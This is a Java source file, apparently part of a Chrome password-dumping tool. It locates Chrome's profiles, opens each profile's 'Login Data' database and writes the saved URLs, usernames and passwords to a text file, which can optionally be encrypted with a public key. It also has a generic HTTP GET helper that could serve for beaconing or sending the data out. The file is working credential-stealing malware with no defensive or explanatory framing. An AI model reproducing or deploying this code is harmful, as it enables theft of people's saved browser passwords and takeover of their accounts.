package random.util;

import random.chrom.ChromeAccount;
import random.chrom.ChromeDatabase;
import random.chrom.ChromeProfile;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.text.SimpleDateFormat;
import java.util.*;

public class Dumper {

    private final Map<File, ChromeAccount[]> profiles;

    private Dumper(final Map<File, ChromeAccount[]> profiles) {
        this.profiles = profiles;
    }

    public static Dumper dumpAccounts(String path) throws Exception, IOException, InstantiationException {
        final OperatingSystem os = OperatingSystem.getOperatingsystem();
        if (os == OperatingSystem.UNKNOWN) {
            throw new Exception(System.getProperty("os.name") + " is not supported by this application!");
        }
        final Path chromeInstall = Paths.get(os.getChromePath());
        final File chromeInfo = new File(chromeInstall.toString(), "Local State");

        if (Files.notExists(chromeInstall)) {
            throw new IOException("Google chrome intallation not found.");
        }

        ArrayList<ChromeProfile> profiles;
        final String[] infoLines = Files.readAllLines(Paths.get(chromeInfo.toURI())).toArray(new String[]{});
        switch (OperatingSystem.getOperatingsystem()) {
            case WINDOWS:
                profiles = Dumper.readProfiles(infoLines);
                break;
            case MAC:
                final String line = infoLines[0];
                final String lines[] = line.split("\\{|\\}");
                profiles = Dumper.readProfiles(lines);
                break;
            default:
                throw new Exception(System.getProperty("os.name") + " is not supported by this application!");
        }

        final String pathToSave = OperatingSystem.getOperatingsystem().getSavePath();
        final HashMap<File, ChromeAccount[]> accounts = new HashMap<>();
        for (final ChromeProfile profile : profiles) {
            final File loginData = new File(chromeInstall.toString() + File.separator + profile.getPath(), "Login Data");
            accounts.put(new File(path != null && !path.equals("")
                    ? path + System.getProperty("file.separator")
                    : pathToSave,
                    getCurrentTime() + "-" + System.getProperty("user.name") + ".txt"), Dumper.readDatabase(loginData));
        }
        if (profiles.size() < 1 || accounts.isEmpty()) {
            throw new InstantiationException("No chrome profiles found!");
        }
        return new Dumper(accounts);
    }

    private static String getCurrentTime() {
        Calendar cal = Calendar.getInstance();
        SimpleDateFormat currentTime = new SimpleDateFormat("dd-MM-yy-HH-mm-ss");
        return currentTime.format(cal.getTime());
    }

    private static ChromeAccount[] readDatabase(final File data) throws IOException, Exception {
        final ChromeDatabase db = ChromeDatabase.connect(data);
        final ArrayList<ChromeAccount> accounts = db.selectAccounts();
        db.close();
        return accounts.toArray(new ChromeAccount[]{});
    }

    private static ArrayList<ChromeProfile> readProfiles(final String[] infoLines) {
        final ArrayList<ChromeProfile> profiles = new ArrayList<>();
        int id = 0;
        for (String line : infoLines) {
            line = line.trim();
            String userName = "\"user_name\":";
            if (line.startsWith(",\"Profile ") || line.contains("\"Default\":")) {
//            if (line.startsWith(userName) || line.contains(userName)) {
                id++;
            }
//            if (line.contains(userName) && id > profiles.size()) {
            if (line.contains(userName)) {
                final int nameIndex = line.indexOf("\"user_name\":") + (OperatingSystem.getOperatingsystem() == OperatingSystem.WINDOWS ? 9 : 8);
//                final int nameIndex = line.indexOf(userName) + userName.length();
                final int lastIndex = line.indexOf("\"", nameIndex);
                profiles.add(new ChromeProfile(id - 1, line.substring(nameIndex, lastIndex)));
            }
        }
        return profiles;
    }

    public int getAmountOfProfiles() {
        return profiles.keySet().size();
    }

    public String getDumpLocation() {
        return profiles.keySet().iterator().next().getParent();
    }

    public int getDumpSize() {
        return profiles.values().stream().mapToInt(b -> b.length).sum();
    }

    public boolean saveToFile(String pubKeyPath) throws IOException {
        for (final File file : profiles.keySet()) {
            if (file.exists()) {
                file.delete();
            }
            file.getParentFile().mkdirs();
            file.createNewFile();
            final ChromeAccount[] accounts = profiles.get(file);
            if (accounts.length > 0) {
                final List<String> lines = new ArrayList<>();
                for (final ChromeAccount account : accounts) {
                    if (!account.getURL().equals("") || !account.getUsername().equals("") || !account.getPassword().equals("")) {
                        lines.add("URL: " + account.getURL());
                        lines.add("Username: " + account.getUsername());
                        lines.add("Password: " + account.getPassword());
                        lines.add("");
                    }
                }
                lines.remove(lines.size() - 1);

                if (pubKeyPath != null && !pubKeyPath.isEmpty()) {
                    String encoded = Encryption.encrypt(pubKeyPath, lines.toString());
                    Files.write(file.toPath(), Collections.singletonList(encoded), StandardCharsets.UTF_8);
                } else {
                    Files.write(file.toPath(), lines, StandardCharsets.UTF_8);
                }
            }
        }
        return true;
    }

    public static void get(String url) {
        BufferedReader in = null;
        InputStreamReader isr = null;
        try {
            URL obj = new URL(url);
            HttpURLConnection connection = (HttpURLConnection) obj.openConnection();

            connection.setRequestMethod("GET");

            isr = new InputStreamReader(connection.getInputStream());
            in = new BufferedReader(isr);
            String inputLine;
            StringBuilder response = new StringBuilder();

            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            System.out.println(response.toString());
        } catch (IOException ignored) {
        } finally {
            close(in);
            close(isr);
        }

    }

    private static void close(Closeable closeable) {
        if (closeable != null) {
            try {
                closeable.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
}
